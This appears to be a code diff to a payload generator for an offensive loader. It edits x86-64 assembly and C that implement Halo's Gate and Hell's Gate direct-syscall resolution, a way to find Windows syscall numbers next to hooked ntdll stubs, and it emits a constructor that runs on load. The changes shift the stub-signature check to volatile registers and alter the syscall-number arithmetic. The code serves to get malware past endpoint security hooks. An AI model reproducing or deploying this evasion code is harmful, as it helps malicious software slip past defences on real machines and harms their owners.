@@ -151,38 +151,32 @@ findSyscallNumber:
 	movzx eax, word [rcx+4]
 	ret
 
-; RCX = &NTDLL.<API> | RDX = 32bytes * Up Increment 
+; RCX = &NTDLL.<API> | RDX = 32bytes * Up Increment
 halosGateUp:
-	xor rsi, rsi
-	xor rdi, rdi 
-	mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX
-	xor rax, rax
-	mov al, 20h            ; 32 * Increment = Syscall Up
-	mul dx                 ; RAX = RAX * RDX = 32 * Syscall Up
-	add rcx, rax           ; RCX = NTDLL.API +- Syscall Stub
-	mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Up by HalosGate (mov r10, rcx; mov eax, <syscall#>)
-	cmp rsi, rdi
-	jne error              ; if the bytes dont match then its prob hooked. Exit gracefully
-	xor rax,rax            ; clear RAX as it will hold the syscall
-	mov ax, [rcx+4]        ; The systemcall number for the API close to the target
-	ret                    ; return to caller
+	mov  r10, 00B8D18B4Ch   ; signature in a VOLATILE register
+	xor  rax, rax
+	mov  al, 20h
+	mul  dx
+	add  rcx, rax
+	mov  r11d, [rcx]        ; VOLATILE scratch
+	cmp  r10d, r11d
+	jne  error
+	xor  rax, rax
+	mov  ax, [rcx+4]
+	ret
 
-
-; RCX = &NTDLL.<API> | RDX = 32bytes * Down Increment 
 halosGateDown:
-	xor rsi, rsi
-	xor rdi, rdi 
-	mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX
-	xor rax, rax
-	mov al, 20h            ; 32 * Increment = Syscall Down
-	mul dx                 ; RAX = RAX * RDX = 32 * Syscall Down
-	sub rcx, rax           ; RCX = NTDLL.API - Syscall Stub
-	mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Down by HalosGate (mov r10, rcx; mov eax, <syscall#>)
-	cmp rsi, rdi
-	jne error              ; if the bytes dont match then its prob hooked. Exit gracefully
-	xor rax,rax            ; clear RAX as it will hold the syscall
-	mov ax, [rcx+4]        ; The systemcall number for the API close to the target
-	ret                    ; return to caller
+	mov  r10, 00B8D18B4Ch
+	xor  rax, rax
+	mov  al, 20h
+	mul  dx
+	sub  rcx, rax
+	mov  r11d, [rcx]
+	cmp  r10d, r11d
+	jne  error
+	xor  rax, rax
+	mov  ax, [rcx+4]
+	ret
 
 error:
 	xor rax, rax ; return 0 for error
@@ -289,7 +283,7 @@ DWORD halosGate(PVOID apiAddr){{
 			}}
 			syscallNumber = halosGateDown(apiAddr, index);
 			if (syscallNumber){{
-				syscallNumber = syscallNumber - index;
+				syscallNumber = syscallNumber + index;
 				break;
 			}}    
 		}}  
@@ -297,6 +291,8 @@ DWORD halosGate(PVOID apiAddr){{
 	return syscallNumber;
     
 }}
+
+NTSTATUS status = 0;
 
 __attribute__((constructor)) void {self.name}(){{
 
@@ -325,7 +321,7 @@ __attribute__((constructor)) void {self.name}(){{
             if apicall[0:2] == 'Nt':
                 resolved[apicall] = f"""
 	HellsGate(resolver.{apicall}_ssn);
-    HellDescent"""
+	HellDescent"""
             elif apicall[0:2] in ['Rt', 'Zw']:
                 resolved[apicall] = f'(({apicall}_t)GetProcAddress(LoadLibrary(TEXT("ntdll.dll")), "{apicall}"))'
             else:
